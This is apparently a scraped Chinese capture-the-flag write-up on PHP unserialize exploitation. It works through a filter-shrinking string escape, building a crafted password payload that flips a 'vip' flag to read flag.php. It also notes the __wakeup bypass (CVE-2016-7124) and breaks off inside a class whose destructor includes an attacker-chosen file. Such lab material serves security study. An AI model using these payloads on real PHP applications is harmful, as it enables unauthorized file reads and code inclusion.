0313233343536373839404142&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param=$_GET['user'];$pass=$_GET['pass'];$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt;写题流程1.字符串过滤后是减少还是增多 flag，php明显比hk长所以是减少2.构造关键成员属性序列化字符串 $vip=true3.变少则判断吃掉的内容，并计算长度&lt;?php class test { var $user = &quot;flag&quot;; var $pass = &quot;benben&quot;; var $vip = true; } echo serialize(new test()); ?&gt;O:4:&quot;test&quot;:3:{s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} 构造减少字符串逃逸 保留 1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} 最终逃逸 1;s:3:&quot;vip&quot;;b:1;} 要算吃掉那一部分 123456789101112131415161718192021222324&lt;?phpfunction filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param='flagflagflagflagflagflagflagflagflagflag';$pass='1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;}';$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt; weakup魔术方法绕过一般不单独出 1__wakeup() CVE-2016-7124反序列化 当序列化字符串中声明的属性数量大于实际实际类中定义的属性数量多时，__wakeup()方法会被跳过。PHP5&lt;5.6.25PHP7&lt;7.0.10 1O:4:&quot;test&quot; 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); class secret{ var $file='index.php'; public function __construct($file){ $this-&gt;file=$file; } function __destruct(){ include_once($this-&gt;file)